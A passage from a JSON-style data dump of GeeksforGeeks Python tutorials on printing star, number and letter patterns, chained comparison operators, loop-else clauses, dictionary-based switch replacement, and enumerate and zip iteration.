Function to demonstrate printing patterndef pypart(n):\u00a0\u00a0\u00a0\u00a0myList = []\u00a0\u00a0\u00a0\u00a0for i in range(1,n+1):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0myList.append(\"*\"*i)\u00a0\u00a0\u00a0\u00a0print(\"\\n\".join(myList))\u00a0# Driver Coden = 5pypart(n)Output*\n**\n***\n****\n*****\u00a0After 180 degree rotationPython3# Python 3.x code to demonstrate star pattern\u00a0# Function to demonstrate printing patterndef pypart2(n):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# number of spaces\u00a0\u00a0\u00a0\u00a0k = 2*n - 2\u00a0\u00a0\u00a0\u00a0\u00a0# outer loop to handle number of rows\u00a0\u00a0\u00a0\u00a0for i in range(0, n):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# inner loop to handle number spaces\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# values changing acc. to requirement\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0for j in range(0, k):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(end=\" \")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# decrementing k after each loop\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0k = k - 2\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# inner loop to handle number of columns\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# values changing acc. to outer loop\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0for j in range(0, i+1):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# printing stars\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"* \", end=\"\")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# ending line after each row\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"\\r\")\u00a0# Driver Coden = 5pypart2(n)Output        * \n      * * \n    * * * \n  * * * * \n* * * * * Printing TrianglePython3# Python 3.x code to demonstrate star pattern\u00a0# Function to demonstrate printing pattern triangledef triangle(n):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# number of spaces\u00a0\u00a0\u00a0\u00a0k = n - 1\u00a0\u00a0\u00a0\u00a0\u00a0# outer loop to handle number of rows\u00a0\u00a0\u00a0\u00a0for i in range(0, n):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# inner loop to handle number spaces\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# values changing acc. to requirement\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0for j in range(0, k):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(end=\" \")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# decrementing k after each loop\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0k = k - 1\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# inner loop to handle number of columns\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# values changing acc. to outer loop\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0for j in range(0, i+1):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# printing stars\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"* \", end=\"\")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# ending line after each row\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"\\r\")\u00a0# Driver Coden = 5triangle(n)Output    * \n   * * \n  * * * \n * * * * \n* * * * * Number PatternPython3# Python 3.x code to demonstrate star pattern\u00a0# Function to demonstrate printing pattern of numbersdef numpat(n):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# initialising starting number\u00a0\u00a0\u00a0\u00a0num = 1\u00a0\u00a0\u00a0\u00a0\u00a0# outer loop to handle number of rows\u00a0\u00a0\u00a0\u00a0for i in range(0, n):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# re assigning num\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0num = 1\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# inner loop to handle number of columns\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# values changing acc. to outer loop\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0for j in range(0, i+1):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# printing number\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(num, end=\" \")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# incrementing number at each column\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0num = num + 1\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# ending line after each row\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"\\r\")\u00a0# Driver coden = 5numpat(n)Output1 \n1 2 \n1 2 3 \n1 2 3 4 \n1 2 3 4 5 Numbers without reassigningPython3# Python 3.x code to demonstrate star pattern\u00a0# Function to demonstrate printing pattern of numbersdef contnum(n):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# initializing starting number\u00a0\u00a0\u00a0\u00a0num = 1\u00a0\u00a0\u00a0\u00a0\u00a0# outer loop to handle number of rows\u00a0\u00a0\u00a0\u00a0for i in range(0, n):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# not re assigning num\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# num = 1\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# inner loop to handle number of columns\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# values changing acc. to outer loop\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0for j in range(0, i+1):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# printing number\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(num, end=\" \")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# incrementing number at each column\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0num = num + 1\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# ending line after each row\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"\\r\")\u00a0n = 5\u00a0# sending 5 as argument# calling Functioncontnum(n)Output1 \n2 3 \n4 5 6 \n7 8 9 10 \n11 12 13 14 15 Character PatternPython3# Python 3.x code to demonstrate star pattern\u00a0# Function to demonstrate printing pattern of alphabetsdef alphapat(n):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# initializing value corresponding to 'A'\u00a0\u00a0\u00a0\u00a0# ASCII value\u00a0\u00a0\u00a0\u00a0num = 65\u00a0\u00a0\u00a0\u00a0\u00a0# outer loop to handle number of rows\u00a0\u00a0\u00a0\u00a0# 5 in this case\u00a0\u00a0\u00a0\u00a0for i in range(0, n):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# inner loop to handle number of columns\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# values changing acc. to outer loop\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0for j in range(0, i+1):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# explicitly converting to char\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0ch = chr(num)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# printing char value\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(ch, end=\" \")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# incrementing number\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0num = num + 1\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# ending line after each row\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"\\r\")\u00a0# Driver Coden = 5alphapat(n)OutputA \nB B \nC C C \nD D D D \nE E E E E Continuous Character patternPython3# Python code 3.x to demonstrate star pattern\u00a0# Function to demonstrate printing pattern of alphabetsdef\u00a0 contalpha(n):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# initializing value corresponding to 'A'\u00a0\u00a0\u00a0\u00a0# ASCII value\u00a0\u00a0\u00a0\u00a0num = 65\u00a0\u00a0\u00a0\u00a0\u00a0# outer loop to handle number of rows-\u00a0\u00a0 for i in range(0, n):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# inner loop to handle number of columns\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# values changing acc. to outer loop\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0for j in range(0, i+1):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# explicitly converting to char\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0ch = chr(num)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# printing char value\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(ch, end=\" \")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# incrementing at each column\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0num = num +1\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# ending line after each row\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"\\r\")\u00a0# Driver coden = 5contalpha(n)Output:A \nB C \nD E F \nG H I J \nK L M N OThis article is contributed by Manjeet Singh(S.Nupur) . If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.\u00a0\u00a0\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "63233f6a34bce5d75495719a9f1d33b9",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Checking more than two conditions is very common in Programming Languages. Let say we want to check below condition:\r\na < b < c\r\nMost common syntax to do it is as follows:\r\nif a < b and b < c :\r\n   {...}\r\nIn Python, there is a better way to write this using Comparison operator Chaining. The chaining of operators can be written as follows:\r\nif a < b < c :\r\n    {.....}\r\nAccording to associativity and precedence in Python, all comparison operations in Python have the same priority, which is lower than that of any arithmetic, shifting or bitwise operation. Also unlike C, expressions like a < b < c have the interpretation that is conventional in mathematics.List of comparison operators in Python:\">\" | \"<\" | \"==\" | \">=\" | \"<=\" | \"!=\" | \"is\" [\"not\"] | [\"not\"] \"in\"\r\nChaining in Comparison Operators:Comparisons yield boolean values: True or False.Comparisons can be chained arbitrarily. For example:x < y <= z is equivalent to x < y and y <= z, except that y is evaluated only once.(but in both cases z is not evaluated at all when x < y is found to be false).Formally, if a, b, c, \u2026, y, z are expressions and op1, op2, \u2026, opN are comparison operators, then a op1 b op2 c \u2026 y opN z is equivalent to a op1 b and b op2 c and \u2026 y opN z, except that each expression is evaluated at most once.Also,a op1 b op2 c doesn\u2019t imply any kind of comparison between a and c, so a < b > cis perfectly legal.# Python code to illustrate# chaining comparison operatorsx = 5print(1 < x < 10)print(10 < x < 20 )print(x < 10 < x*10 < 100)print(10 > x <= 9)print(5 == x > 4)Output:\r\nTrue\r\nFalse\r\nTrue\r\nTrue\r\nTrue\r\nAnother Example:# Python code to illustrate# chaining comparison operatorsa, b, c, d, e, f = 0, 5, 12, 0, 15, 15exp1 = a <= b < c > d is not e is fexp2 = a is d > f is not cprint(exp1)print(exp2)Output:\r\nTrue\r\nFalse\r\nReference : Python 3 DocumentationThis article is contributed by Pratik Chhajer. If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "cb25783e7f0c5bd1edda624b22a6b9df",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "In most of the programming languages (C/C++, Java, etc), the use of else statement has been restricted with the if conditional statements. But Python also allows us to use the else condition with for loops.\u00a0The else block just after for/while is executed only when the loop is NOT terminated by a break statement.Else block is executed in below Python 3.x program:\u00a0Pythonfor i in range(1, 4):\u00a0\u00a0\u00a0\u00a0print(i)else:\u00a0 # Executed because no break in for\u00a0\u00a0\u00a0\u00a0print(\"No Break\")Output :\u00a01\n2\n3\nNo BreakElse block is NOT executed in Python 3.x or below:\u00a0Pythonfor i in range(1, 4):\u00a0\u00a0\u00a0\u00a0print(i)\u00a0\u00a0\u00a0\u00a0breakelse: # Not executed as there is a break\u00a0\u00a0\u00a0\u00a0print(\"No Break\")Output :\u00a01Such type of else is useful only if there is an if condition present inside the loop which somehow depends on the loop variable.In the following example, the else statement will only be executed if no element of the array is even, i.e. if statement has not been executed for any iteration. Therefore for the array [1, 9, 8] the if is executed in the third iteration of the loop and hence the else present after the for loop is ignored. In the case of array [1, 3, 5] the if is not executed for any iteration and hence the else after the loop is executed.Python# Python 3.x program to check if an array consists# of even numberdef contains_even_number(l):\u00a0\u00a0\u00a0\u00a0for ele in l:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if ele % 2 == 0:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print (\"list contains an even number\")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0break\u00a0\u00a0\u00a0\u00a0\u00a0# This else executes only if break is NEVER\u00a0\u00a0\u00a0\u00a0# reached and loop terminated after all iterations.\u00a0\u00a0\u00a0\u00a0else:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print (\"list does not contain an even number\")\u00a0# Driver codeprint (\"For List 1:\")contains_even_number([1, 9, 8])print (\" \\nFor List 2:\")contains_even_number([1, 3, 5])Output:\u00a0For List 1:\nlist contains an even number\n\nFor List 2:\nlist does not contain an even numberAs an exercise, predict the output of the following program.\u00a0Pythoncount = 0while (count < 1):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0count = count+1\u00a0\u00a0\u00a0\u00a0print(count)\u00a0\u00a0\u00a0\u00a0breakelse:\u00a0\u00a0\u00a0\u00a0print(\"No Break\")This article is contributed by Harshit Agrawal. If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "96cf540f4601959540cafec715967e73",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "What is the replacement of Switch Case in Python?Unlike every other programming language we have used before, Python does not have a switch or case statement. To get around this fact, we use dictionary mapping.Python3# Function to convert number into string# Switcher is dictionary data type heredef numbers_to_strings(argument):\u00a0\u00a0\u00a0\u00a0switcher = {\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a00: \"zero\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a01: \"one\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a02: \"two\",\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0# get() method of dictionary data type returns\u00a0\u00a0\u00a0\u00a0# value of passed argument if it is present\u00a0\u00a0\u00a0\u00a0# in dictionary otherwise second argument will\u00a0\u00a0\u00a0\u00a0# be assigned as default value of passed argument\u00a0\u00a0\u00a0\u00a0return switcher.get(argument, \"nothing\")\u00a0# Driver programif __name__ == \"__main__\":\u00a0\u00a0\u00a0\u00a0argument=0\u00a0\u00a0\u00a0\u00a0print (numbers_to_strings(argument))This code is analogous to the given code in C++ :\u00a0CPP#include<bits/stdc++.h>using namespace std;\u00a0// Function to convert number into stringstring numbers_to_strings(int argument){\u00a0\u00a0\u00a0\u00a0switch(argument) {\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0case 0:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return \"zero\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0case 1:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return \"one\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0case 2:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return \"two\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0default:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return \"nothing\";\u00a0\u00a0\u00a0\u00a0};};\u00a0// Driver programint main(){\u00a0\u00a0\u00a0\u00a0int argument = 0;\u00a0\u00a0\u00a0\u00a0cout << numbers_to_strings(argument);\u00a0\u00a0\u00a0\u00a0return 0;}Output:\u00a0ZeroThis article is contributed by Shashank Mishra (Gullu). If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "b11c3d22ef0277f6e2aa3fb5612b2905",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Prerequisite : Iterators in PythonFollowing are different ways to use iterators.C-style approach:This approach requires prior knowledge of total number of iterations.# A C-style way of accessing list elementscars = [\"Aston\", \"Audi\", \"McLaren\"]i = 0while (i < len(cars)):\u00a0\u00a0\u00a0\u00a0print cars[i]\u00a0\u00a0\u00a0\u00a0i += 1Output:Aston\r\nAudi \r\nMcLaren \r\nImportant Points:This style of looping is rarely used by python programmers.This 4-step approach creates no compactness with single-view looping construct.This is also prone to errors in large-scale programs or designs.There is no C-Style for loop in Python, i.e., a loop like for (int i=0; i<n; i++)\u00a0Use of for-in (or for each) style:This style is used in python containing iterator of lists, dictonary, n dimensional-arrays etc. The iterator fetches each component and prints data while looping. The iterator is automatically incremented/decremented in this construct.# Accessing items using for-in loop\u00a0\u00a0cars = [\"Aston\", \"Audi\", \"McLaren\"]for x in cars:\u00a0\u00a0\u00a0\u00a0print xOutput:Aston\r\nAudi \r\nMcLaren \r\nSee this for more examples of different data types.Indexing using Range function: We can also use indexing using range() in Python.# Accessing items using indexes and for-in\u00a0\u00a0cars = [\"Aston\", \"Audi\", \"McLaren\"]for i in range(len(cars)):\u00a0\u00a0\u00a0\u00a0print cars[i]Output:Aston\r\nAudi \r\nMcLaren \r\n\u00a0Enumerate:Enumerate is built-in python function that takes input as iterator, list etc and returns a tuple containing index and data at that index in the iterator sequence. For example, enumerate(cars), returns a iterator that will return (0, cars[0]), (1, cars[1]), (2, cars[2]), and so on.# Accessing items using enumerate()\u00a0\u00a0cars = [\"Aston\" , \"Audi\", \"McLaren \"]for i, x in enumerate(cars):\u00a0\u00a0\u00a0\u00a0print (x)Output :\r\nAston\r\nAudi\r\nMcLaren Below solution also works.# Accessing items and indexes enumerate()\u00a0\u00a0cars = [\"Aston\" , \"Audi\", \"McLaren \"]for x in enumerate(cars):\u00a0\u00a0\u00a0\u00a0print (x[0], x[1])Output :\r\n(0, 'Aston')\r\n(1, 'Audi')\r\n(2, 'McLaren ')We can also directly print returned value of enumerate() to see what it returns.# Printing return value of enumerate()\u00a0\u00a0\u00a0cars = [\"Aston\" , \"Audi\", \"McLaren \"]print enumerate(cars)Output :\r\n[(0, 'Aston'), (1, 'Audi'), (2, 'McLaren ')]Enumerate takes parameter start which is default set to zero. We can change this parameter to any value we like. In the below code we have used start as 1.# demonstrating the use of start in enumerate\u00a0\u00a0cars = [\"Aston\" , \"Audi\", \"McLaren \"]for x in enumerate(cars, start=1):\u00a0\u00a0\u00a0\u00a0print (x[0], x[1])Output :\r\n(1, 'Aston')\r\n(2, 'Audi')\r\n(3, 'McLaren ')enumerate() helps to embed solution for accessing each data item in the iterator and fetching index of each data item.\u00a0Looping extensions:i) Two iterators for a single looping construct: In this case, a list and dictionary are to be used for each iteration in a single looping block using enumerate function. Let us see example.# Two separate listscars = [\"Aston\", \"Audi\", \"McLaren\"]accessories = [\"GPS kit\", \"Car repair-tool kit\"]\u00a0\u00a0# Single dictionary holds prices of cars and\u00a0# its accessories.# First three items store prices of cars and# next two items store prices of accessories.prices = {1:\"570000$\", 2:\"68000$\", 3:\"450000$\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a04:\"8900$\", 5:\"4500$\"}\u00a0\u00a0# Printing prices of carsfor index, c in enumerate(cars, start=1):\u00a0\u00a0\u00a0\u00a0print \"Car: %s Price: %s\"%(c, prices[index])\u00a0\u00a0# Printing prices of accessoriesfor index, a in enumerate(accessories,start=1):\u00a0\u00a0\u00a0\u00a0print (\"Accessory: %s Price: %s\"\\\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0%(a,prices[index+len(cars)]))Output:Car: Aston Price: 570000$\r\nCar: Audi Price: 68000$\r\nCar: McLaren Price: 450000$\r\nAccessory: GPS kit Price: 8900$\r\nAccessory: Car repair-tool kit Price: 4500$\r\nii) zip function (Both iterators to be used in single looping construct):This function is helpful to combine similar type iterators(list-list or dict- dict etc,) data items at ith position. It uses the shortest length of these input iterators. Other items of larger length iterators are skipped. In case of empty iterators, it returns No output.For example, the use of zip for two lists (iterators) helped to combine a single car and its required accessory.# Python program to demonstrate the working of zip\u00a0\u00a0# Two separate listscars = [\"Aston\", \"Audi\", \"McLaren\"]accessories = [\"GPS\", \"Car Repair Kit\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"Dolby sound kit\"]\u00a0\u00a0# Combining lists and printingfor c, a in zip(cars, accessories):\u00a0\u00a0\u00a0\u00a0print \"Car: %s, Accessory required: %s\"\\\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0%(c, a)Output:Car: Aston, Accessory required: GPS\r\nCar: Audi, Accessory required: Car Repair Kit\r\nCar: McLaren, Accessory required: Dolby sound kitThe reverse of these iterators from zip function is known as unzipping using \u201c*\u201d operator.Use of enumerate function and zip function helps to achieve an effective extension of iteration logic in python and solves many more sub-problems of a huge task or problem.# Python program to demonstrate unzip (reverse\u00a0# of zip)using * with zip function\u00a0\u00a0# Unzip listsl1,l2 = zip(*[('Aston', 'GPS'),\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0('Audi', 'Car Repair'),\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0('McLaren', 'Dolby sound kit')\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0])\u00a0\u00a0# Printing unzipped lists\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(l1)print(l2)Output:('Aston', 'Audi', 'McLaren')\r\n('GPS', 'Car Repair', 'Dolby sound kit')\r\nReferences:1. https://docs.python.org/2/library/functions.html#enumerate2. https://docs.python.org/2/library/functions.html#zipThis article is contributed by Krishnasagar Subhedarpage. If you like GeeksforGeeks and would like to contribute, you can also write an article and mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "d4ea219970051dd7b3d38c342acf91be",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
